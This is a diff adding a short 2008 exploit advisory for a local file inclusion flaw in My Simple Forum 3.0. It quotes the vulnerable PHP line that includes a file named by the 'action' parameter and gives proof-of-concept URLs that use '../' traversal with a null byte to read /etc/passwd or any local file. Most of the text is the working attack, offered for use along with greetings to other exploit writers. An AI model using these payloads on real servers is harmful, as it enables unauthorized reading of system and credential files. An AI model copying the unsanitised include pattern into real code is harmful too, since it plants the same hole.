@@ -1,0 +1,29 @@
+/*
+
+	$Id: mysimpleforum-3.0-lfi.txt,v 0.1 2008/12/04 23:03:00 cOndemned Exp $
+
+	My Simple Forum 3.0 (index.php action) Local File Inclusion Vulnerability
+	Bug discovered by cOndemned
+
+	Script download: http://drennansoft.com/index.php?action=download&id=1
+
+	Greetz: ZaBeaTy, str0ke, d2, TBH, Avantura
+
+*/
+
+
+Source of index.php:
+
+	49.	if(file_exists('site/'.$_GET['action'].'.php')) {
+	50.	include('site/'.$_GET['action'].'.php');
+	51.	} else {
+	
+	local file inclusion on line 50
+	
+
+Proof of concept:
+
+	http://[host]/[my_simple_forum_path]/index.php?action=../../../../../../../etc/passwd%00
+	http://[host]/[my_simple_forum_path]/index.php?action=../../../../[localfile]%00
+
+# milw0rm.com [2008-12-04]
